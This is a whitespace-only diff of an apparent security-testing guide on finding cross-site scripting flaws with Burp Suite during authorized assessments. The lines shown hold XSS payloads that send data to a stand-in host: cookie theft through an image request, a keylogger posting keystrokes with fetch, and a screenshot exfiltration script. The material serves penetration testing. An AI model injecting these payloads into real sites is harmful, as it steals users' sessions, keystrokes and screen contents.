@@ -1,7 +1,7 @@
 ---
 name: testing-for-xss-vulnerabilities-with-burpsuite
 description: Identifying and validating cross-site scripting vulnerabilities using
-  Burp Suite's scanner, intruder, and repeater tools during authorized security assessments.
+ Burp Suite's scanner, intruder, and repeater tools during authorized security assessments.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -228,7 +228,7 @@ new Image().src='https://attacker-server.example.com/log?cookie='+document.cooki
 # Keylogger payload (demonstrates impact severity):
 <script>
 document.onkeypress=function(e){
-  fetch('https://attacker-server.example.com/keys?k='+e.key);
+ fetch('https://attacker-server.example.com/keys?k='+e.key);
 }
 </script>
 
@@ -236,9 +236,9 @@ document.onkeypress=function(e){
 <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
 <script>
 html2canvas(document.body).then(function(canvas){
-  fetch('https://attacker-server.example.com/screen',{
-    method:'POST',body:canvas.toDataURL()
-  });
+ fetch('https://attacker-server.example.com/screen',{
+ method:'POST',body:canvas.toDataURL()
+ });
 });
 </script>
 
